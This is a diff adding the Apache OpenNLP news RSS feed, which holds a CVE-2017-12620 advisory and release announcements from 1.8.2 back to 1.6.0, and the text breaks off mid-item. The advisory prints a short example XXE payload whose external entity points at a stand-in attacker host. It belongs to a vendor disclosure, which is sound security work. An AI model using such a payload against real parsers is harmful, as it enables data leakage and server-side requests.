@@ -1,0 +1,914 @@
+<?xml version="1.0"?>
+<!--
+   Licensed to the Apache Software Foundation (ASF) under one
+   or more contributor license agreements.  See the NOTICE file
+   distributed with this work for additional information
+   regarding copyright ownership.  The ASF licenses this file
+   to you under the Apache License, Version 2.0 (the
+   "License"); you may not use this file except in compliance
+   with the License.  You may obtain a copy of the License at
+
+     http://www.apache.org/licenses/LICENSE-2.0
+
+   Unless required by applicable law or agreed to in writing,
+   software distributed under the License is distributed on an
+   "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
+   KIND, either express or implied.  See the License for the
+   specific language governing permissions and limitations
+   under the License. 
+-->
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Apache OpenNLP</title>
+    <link>https://opennlp.apache.org</link>
+    <atom:link href="https://opennlp.apache.org/feed.xml" rel="self" type="application/rss+xml" />
+    <description>The Apache OpenNLP library is a machine learning based toolkit for the processing of natural language text</description>
+    <language>en-us</language>
+    <pubDate>Tue, 10 Oct 2017 02:03:43 +0000</pubDate>
+    <lastBuildDate>Tue, 10 Oct 2017 02:03:43 +0000</lastBuildDate>
+
+    <item>
+      <title>CVE-2017-12620 - Apache OpenNLP XXE vulnerability</title>
+      <link>https://opennlp.apache.org/news/cve-2017-12620.html</link>
+      <pubDate>Mon, 2 Oct 2017 00:00:00 +0000</pubDate>
+      <guid isPermaLink="false">news/cve-2017-12620.html</guid>
+      	<description>
+	&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;Severity: Medium&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;Vendor:
+The Apache Software Foundation&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;Versions Affected:&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;ulist&quot;&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;OpenNLP 1.5.0 to 1.5.3&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;OpenNLP 1.6.0&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;OpenNLP 1.7.0 to 1.7.2&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;OpenNLP 1.8.0 to 1.8.1&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;Description:
+When loading models or dictionaries that contain XML it is possible to
+perform an XXE attack, since OpenNLP is a library, this only affects
+applications that load models or dictionaries from untrusted sources.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;Mitigation:
+All users who load models or XML dictionaries from untrusted sources
+should update to 1.8.2.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;Example:&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;An attacker can place this:&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;listingblock&quot;&gt;
+&lt;div class=&quot;content&quot;&gt;
+&lt;pre class=&quot;prettyprint highlight&quot;&gt;&lt;code class=&quot;language-xml&quot; data-lang=&quot;xml&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; ?&amp;gt;
+&amp;lt;!DOCTYPE r [
+&amp;lt;!ELEMENT r ANY &amp;gt;
+&amp;lt;!ENTITY sp SYSTEM &quot;http://evil.attacker.com/&quot;&amp;gt;
+]&amp;gt;
+&amp;lt;r&amp;gt;&amp;amp;sp;&amp;lt;/r&amp;gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;Inside one of the XML files, either a dictionary or embedded inside a
+model package, to demonstrate this vulnerability.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;Credit:
+This issue was discovered by ﻿Nishil Shah of Salesforce.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;--The Apache OpenNLP Team&lt;/p&gt;
+&lt;/div&gt;
+	</description>
+    </item>
+    <item>
+      <title>Apache OpenNLP 1.8.2 released</title>
+      <link>https://opennlp.apache.org/news/release-182.html</link>
+      <pubDate>Fri, 15 Sep 2017 00:00:00 +0000</pubDate>
+      <guid isPermaLink="false">news/release-182.html</guid>
+      	<description>
+	&lt;div id=&quot;preamble&quot;&gt;
+&lt;div class=&quot;sectionbody&quot;&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;The Apache OpenNLP team is pleased to announce the release of version 1.8.2 of Apache OpenNLP.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;The Apache OpenNLP library is a machine learning based toolkit for the processing of natural language text.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;It supports the most common NLP tasks, such as tokenization, sentence segmentation, part-of-speech tagging, named entity extraction, chunking, parsing, and coreference resolution.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;The OpenNLP 1.8.2 binary and source distributions are available for download from our &lt;a href=&quot;/download.html&quot;&gt;download page&lt;/a&gt;.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;The OpenNLP library is distributed by Maven Central as well. See the &lt;a href=&quot;/maven-dependency.html&quot;&gt;Maven Dependency&lt;/a&gt; page for more details.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;Java 8 is required. Maven 3.3.9 is required for building the Source Distribution.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;To build everything execute the following command in the root folder: &lt;code&gt;mvn clean install&lt;/code&gt;&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;The results of the build will be placed in: &lt;code&gt;opennlp-distr/target/apache-opennlp-1.8.2-bin.tar.gz&lt;/code&gt; (or &lt;code&gt;.zip&lt;/code&gt;)&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;h1 id=&quot;what_s_new_in_apache_opennlp_1_8_2&quot; class=&quot;sect0&quot;&gt;What&amp;#8217;s new in Apache OpenNLP 1.8.2&lt;/h1&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;This release introduces some minor improvements and bug fixes. Java 1.8 is required.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;The release contains the following noteworthy changes:
+- The Leipzig format support was improved to extract data for langdetect model training
+- Maxents loglikelihood treshold can be configured by the user
+- Added data verification for the eval data
+- Fixed handling of xml parsers used through out the package&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;A detailed list of the issues related to this release can be found in the release notes.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;Thanks again to all contributors and committers for their help.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;--The Apache OpenNLP Team&lt;/p&gt;
+&lt;/div&gt;
+	</description>
+    </item>
+    <item>
+      <title>Apache OpenNLP 1.8.1 released</title>
+      <link>https://opennlp.apache.org/news/release-181.html</link>
+      <pubDate>Sat, 8 Jul 2017 00:00:00 +0000</pubDate>
+      <guid isPermaLink="false">news/release-181.html</guid>
+      	<description>
+	&lt;div id=&quot;preamble&quot;&gt;
+&lt;div class=&quot;sectionbody&quot;&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;The Apache OpenNLP team is pleased to announce the release of version 1.8.1 of Apache OpenNLP.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;The Apache OpenNLP library is a machine learning based toolkit for the processing of natural language text.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;It supports the most common NLP tasks, such as tokenization, sentence segmentation, part-of-speech tagging, named entity extraction, chunking, parsing, and coreference resolution.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;The OpenNLP 1.8.1 binary and source distributions are available for download from our &lt;a href=&quot;/download.html&quot;&gt;download page&lt;/a&gt;.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;The OpenNLP library is distributed by Maven Central as well. See the &lt;a href=&quot;/maven-dependency.html&quot;&gt;Maven Dependency&lt;/a&gt; page for more details.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;Java 1.8 is required to run OpenNLP Maven 3.3.9 is required for building it building from the Source Distribution.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;To build everything execute the following command in the root folder: &lt;code&gt;mvn clean install&lt;/code&gt;&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;The results of the build will be placed in: &lt;code&gt;opennlp-distr/target/apache-opennlp-1.8.1-bin.tar.gz&lt;/code&gt; (or &lt;code&gt;.zip&lt;/code&gt;)&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;h1 id=&quot;what_s_new_in_apache_opennlp_1_8_1&quot; class=&quot;sect0&quot;&gt;What&amp;#8217;s new in Apache OpenNLP 1.8.1&lt;/h1&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;This release introduces many new features, improvements and bug fixes. The API has been improved for a better consistency and many deprecated methods were removed. Java 1.8 is required.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;Additionally the release contains the following noteworthy changes:&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;ulist&quot;&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;A new Language Detection Component&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Support for Irish Sentence Bank formats&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Support to train the sentence detector and tokenizer on the UD corpus&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Evaluation tests now support ISO-639-3 language codes&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Convenience methods to load models from a path&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Refactored the Data Indexer Code&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Optimized NGram creation loop to better leverage CPU cache&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Refactored BratNameSampleStream&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Remove deprecated code from util package&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Redesigned web site - &lt;a href=&quot;https://opennlp.apache.org&quot; class=&quot;bare&quot;&gt;https://opennlp.apache.org&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;New logo for the project&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;A detailed list of the issues related to this release can be found in the release notes.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;Thanks again to all contributors and committers for their help.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;--The Apache OpenNLP Team&lt;/p&gt;
+&lt;/div&gt;
+	</description>
+    </item>
+    <item>
+      <title>Apache OpenNLP 1.8.0 released</title>
+      <link>https://opennlp.apache.org/news/release-180.html</link>
+      <pubDate>Fri, 19 May 2017 00:00:00 +0000</pubDate>
+      <guid isPermaLink="false">news/release-180.html</guid>
+      	<description>
+	&lt;div id=&quot;preamble&quot;&gt;
+&lt;div class=&quot;sectionbody&quot;&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;The Apache OpenNLP team is pleased to announce the release of version 1.8.0 of Apache OpenNLP.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;The Apache OpenNLP library is a machine learning based toolkit for the processing of natural language text.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;It supports the most common NLP tasks, such as tokenization, sentence segmentation, part-of-speech tagging, named entity extraction, chunking, parsing, and coreference resolution.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;The OpenNLP 1.8.0 binary and source distributions are available for download from our &lt;a href=&quot;/download.html&quot;&gt;download page&lt;/a&gt;.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;The OpenNLP library is distributed by Maven Central as well. See the &lt;a href=&quot;/maven-dependency.html&quot;&gt;Maven Dependency&lt;/a&gt; page for more details.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;Java 1.8 is required to run OpenNLP Maven 3.3.9 is required for building it building from the Source Distribution.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;To build everything execute the following command in the root folder: &lt;code&gt;mvn clean install&lt;/code&gt;&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;The results of the build will be placed in: &lt;code&gt;opennlp-distr/target/apache-opennlp-1.8.0-bin.tar.gz&lt;/code&gt; (or &lt;code&gt;.zip&lt;/code&gt;)&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;h1 id=&quot;what_s_new_in_apache_opennlp_1_8_0&quot; class=&quot;sect0&quot;&gt;What&amp;#8217;s new in Apache OpenNLP 1.8.0&lt;/h1&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;This release introduces many new features, improvements and bug fixes. The API has been improved for a better consistency and many deprecated methods were removed. Java 1.8 is required.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;Additionally the release contains the following noteworthy changes:&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;ulist&quot;&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;POS Tagger context generator now supports feature generation XML&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Add a Name Finder feature generator that adds POS Tag features&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Add CONLL-U format support&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Improve default Name Finder settings&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;TokenNameFinderEvaluator CLI now support nameTypes argument&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Stupid backoff is now the default in NGramLanguageModel&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Language codes now are ISO 639-3 compliant&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Add many unit tests&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Distribution package now includes example parameters file&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Now prefix and suffix feature generators are configurable&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Remove API in Document Categorizer for user specified tokenizer&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Learnable lemmatizer now returns all possible lemmas for a given word and pos tag&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Lemmatizer API backward compatibility break: no need to encode/decode lemmas anymore, now LemmatizerME lemmatize method returns the actual lemma&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Add stemmer, detokenizer and sentence detection abbreviations for Irish&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Chunker SequenceValidator signature changed to allow access to both token and POS tag&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;A detailed list of the issues related to this release can be found in the release notes.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;Thanks again to all contributors and committers for their help.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;--The Apache OpenNLP Team&lt;/p&gt;
+&lt;/div&gt;
+	</description>
+    </item>
+    <item>
+      <title>Apache OpenNLP 1.7.2 released</title>
+      <link>https://opennlp.apache.org/news/release-172.html</link>
+      <pubDate>Sat, 4 Feb 2017 00:00:00 +0000</pubDate>
+      <guid isPermaLink="false">news/release-172.html</guid>
+      	<description>
+	&lt;div id=&quot;preamble&quot;&gt;
+&lt;div class=&quot;sectionbody&quot;&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;The Apache OpenNLP team is pleased to announce the release of version 1.7.2 of Apache OpenNLP.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;The Apache OpenNLP library is a machine learning based toolkit for the processing of natural language text.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;It supports the most common NLP tasks, such as tokenization, sentence segmentation, part-of-speech tagging, named entity extraction, chunking, parsing, and coreference resolution.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;The OpenNLP 1.7.2 binary and source distributions are available for download from our download page: &lt;a href=&quot;http://opennlp.apache.org/cgi-bin/download.cgi&quot; class=&quot;bare&quot;&gt;http://opennlp.apache.org/cgi-bin/download.cgi&lt;/a&gt;&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;The OpenNLP library is distributed by Maven Central as well. See the Maven Dependency page for more details: &lt;a href=&quot;http://opennlp.apache.org/maven-dependency.html&quot; class=&quot;bare&quot;&gt;http://opennlp.apache.org/maven-dependency.html&lt;/a&gt;&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class=&quot;sect1&quot;&gt;
+&lt;h2 id=&quot;requirements&quot;&gt;Requirements&lt;/h2&gt;
+&lt;div class=&quot;sectionbody&quot;&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;Java 1.8 is required to run OpenNLP
+Maven 3.3.9 is required for building it&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class=&quot;sect1&quot;&gt;
+&lt;h2 id=&quot;building_from_the_source_distribution&quot;&gt;Building from the Source Distribution&lt;/h2&gt;
+&lt;div class=&quot;sectionbody&quot;&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;To build everything execute the following command in the root folder:
+    mvn clean install&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;The results of the build will be placed  in:
+    opennlp-distr/target/apache-opennlp-1.7.2-bin.tar-gz (or .zip)&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;What is new in Apache OpenNLP 1.7.2&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;listingblock&quot;&gt;
+&lt;div class=&quot;content&quot;&gt;
+&lt;pre&gt;This release introduces many new features, improvements and bug fixes. The API
+has been improved for a better consistency and 1.4 deprecated methods were
+removed. Now Java 1.8 is required.
+
+Additionally the release contains the following noteworthy changes:
+
+- Name Finder evaluation can now show a confusion matrix
+- The default evaluation output contains more details
+- Added a Language Model CLI tool
+- Add Moses format support
+- More refactoring and cleanup, specially in Machine Learning package and Dictionary
+- Removed deprecated trainers from UIMA integration
+- Fixed potential localization issues and added maven plugin to prevent it (ForbiddenAPI)
+- Fixed issues with the BRAT corpus reader
+- Deprecated GIS class, will be removed in a future 1.8.x release
+
+A detailed list of the issues related to this release can be found in the release
+notes.&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+	</description>
+    </item>
+    <item>
+      <title>Apache OpenNLP 1.7.1 released</title>
+      <link>https://opennlp.apache.org/news/release-171.html</link>
+      <pubDate>Mon, 23 Jan 2017 00:00:00 +0000</pubDate>
+      <guid isPermaLink="false">news/release-171.html</guid>
+      	<description>
+	&lt;div id=&quot;preamble&quot;&gt;
+&lt;div class=&quot;sectionbody&quot;&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;The Apache OpenNLP team is pleased to announce the release of version 1.7.1 of Apache OpenNLP.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;The Apache OpenNLP library is a machine learning based toolkit for the processing of natural language text.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;It supports the most common NLP tasks, such as tokenization, sentence segmentation, part-of-speech tagging, named entity extraction, chunking, parsing, and coreference resolution.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;The OpenNLP 1.7.1 binary and source distributions are available for download from our download page: &lt;a href=&quot;http://opennlp.apache.org/cgi-bin/download.cgi&quot; class=&quot;bare&quot;&gt;http://opennlp.apache.org/cgi-bin/download.cgi&lt;/a&gt;&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;The OpenNLP library is distributed by Maven Central as well. See the Maven Dependency page for more details: &lt;a href=&quot;http://opennlp.apache.org/maven-dependency.html&quot; class=&quot;bare&quot;&gt;http://opennlp.apache.org/maven-dependency.html&lt;/a&gt;&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class=&quot;sect1&quot;&gt;
+&lt;h2 id=&quot;requirements&quot;&gt;Requirements&lt;/h2&gt;
+&lt;div class=&quot;sectionbody&quot;&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;Java 1.8 is required to run OpenNLP
+Maven 3.3.9 is required for building it&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class=&quot;sect1&quot;&gt;
+&lt;h2 id=&quot;building_from_the_source_distribution&quot;&gt;Building from the Source Distribution&lt;/h2&gt;
+&lt;div class=&quot;sectionbody&quot;&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;To build everything execute the following command in the root folder:&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;literalblock&quot;&gt;
+&lt;div class=&quot;content&quot;&gt;
+&lt;pre&gt;mvn clean install&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;The results of the build will be placed  in:
+   opennlp-distr/target/apache-opennlp-1.7.1-bin.tar-gz (or .zip)&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;What is new in Apache OpenNLP 1.7.1&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;listingblock&quot;&gt;
+&lt;div class=&quot;content&quot;&gt;
+&lt;pre&gt;This release introduces many new features, improvements and bug fixes.
+
+Additionally the release contains the following noteworthy changes:
+
+- Travis CI Integration
+- Added support to LETSMT format
+- All stdout can be disabled during training via verbose parameter
+- Improved and extended evaluation tests
+- Refactoring and cleanup of code base
+- Code fully migrated to Java 8
+- Added an improved GitHub README page
+
+For a complete list of fixed bugs and improvements please see the RELEASE_NOTES file included in the distribution.
+
+
+--The Apache OpenNLP Team&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+	</description>
+    </item>
+    <item>
+      <title>Apache OpenNLP 1.7.0 released</title>
+      <link>https://opennlp.apache.org/news/release-170.html</link>
+      <pubDate>Sat, 31 Dec 2016 00:00:00 +0000</pubDate>
+      <guid isPermaLink="false">news/release-170.html</guid>
+      	<description>
+	&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;The Apache OpenNLP team is pleased to announce the release of version 1.7.0 of Apache OpenNLP.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;The Apache OpenNLP library is a machine learning based toolkit for the processing of natural language text.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;It supports the most common NLP tasks, such as tokenization, sentence segmentation, part-of-speech tagging, named entity extraction, chunking, parsing, and coreference resolution.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;The OpenNLP 1.7.0 binary and source distributions are available for download from our download page: &lt;a href=&quot;http://opennlp.apache.org/cgi-bin/download.cgi&quot; class=&quot;bare&quot;&gt;http://opennlp.apache.org/cgi-bin/download.cgi&lt;/a&gt;&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;The OpenNLP library is distributed by Maven Central as well. See the Maven Dependency page for more details: &lt;a href=&quot;http://opennlp.apache.org/maven-dependency.html&quot; class=&quot;bare&quot;&gt;http://opennlp.apache.org/maven-dependency.html&lt;/a&gt;&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;This release introduces many new features, improvements and bug fixes. The API has been improved for a better consistency and deprecated methods were removed. Now Java 1.8 and Maven 3.3.9 are required.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;Additionally the release contains the following noteworthy changes:&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;ulist&quot;&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;OpenNLP is up to 50% faster at analyzing content&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;A lot of deprecated code has been removed&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Code base has been cleaned up&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;There is a new brat annotation service&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Documentation was improved and extended&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;A Naive Bayesian Classifier implementation was added&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Morofologik addon is now included&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Added a language model component&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Added a CLI to the lemmatizer component.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Added a supervised statistical lemmatizer.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;The lemmatizer component API has been entirely rewritten. The changes in
+the previously existing Dictionary-based lemmatizer are not backward compatible.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;A detailed list of the issues related to this release can be found in the release
+notes.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;For a complete list of fixed bugs and improvements please see the RELEASE_NOTES file included in the distribution.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;--The Apache OpenNLP Team&lt;/p&gt;
+&lt;/div&gt;
+	</description>
+    </item>
+    <item>
+      <title>Apache OpenNLP 1.6.0 released</title>
+      <link>https://opennlp.apache.org/news/release-160.html</link>
+      <pubDate>Mon, 13 Jul 2015 00:00:00 +0000</pubDate>
+      <guid isPermaLink="false">news/release-160.html</guid>
+      	<description>
+	&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;The Apache OpenNLP team is pleased to announce the release of version 1.6.0 of Apache OpenNLP.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;The Apache OpenNLP library is a machine learning based toolkit for the processing of natural language text.
